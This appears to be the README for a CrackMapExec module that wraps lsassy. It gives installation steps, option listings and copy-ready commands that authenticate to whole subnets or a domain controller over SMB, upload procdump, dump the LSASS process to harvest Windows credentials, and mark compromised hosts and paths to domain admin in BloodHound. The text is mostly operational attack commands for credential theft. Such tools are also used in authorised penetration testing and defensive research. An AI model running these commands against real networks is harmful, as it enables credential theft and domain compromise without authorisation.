## Installation

* Copy `lsassy.py` in `[CME Path]/cme/modules`
* Reinstall CrackMapExec `python setup.py install`

## Requirements

* [lsassy](https://github.com/Hackndo/lsassy/)

## Usage

```bash
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy
```

You can check available options using

```
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy --options
[*] lsassy module options:

            TMP_DIR             Path where process dump should be saved on target system (default: C:\Windows\Temp\)
            SHARE               Share to upload procdump and dump lsass (default: C$)
            PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/)
            PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe)
            BLOODHOUND          Enable Bloodhound integration (default: false)
            NEO4JURI            URI for Neo4j database (default: 127.0.0.1)
            NEO4JPORT           Listeninfg port for Neo4j database (default: 7687)
            NEO4JUSER           Username for Neo4j database (default: 'neo4j')
            NEO4JPASS           Password for Neo4j database (default: 'neo4j')

```

Options can be set using

```bash
cme smb dc01.adsec.local -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o PROCDUMP_PATH='/home/pixis/Tools/' PROCDUMP_EXE_NAME='procdump.exe'
```

## BloodHound integration

BloodHound additional information can be obtained. `BLOODHOUND` option may be switched to enable this functionality.

* Set "owned" on BloodHound computer nodes that are compromised
* Detect compromised users that have a path to domain admin

```bash
cme smb dc01.adsec.local -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o BLOODHOUND=True
```

![CME Module example](/assets/cme_lsassy.gif)

Have fun
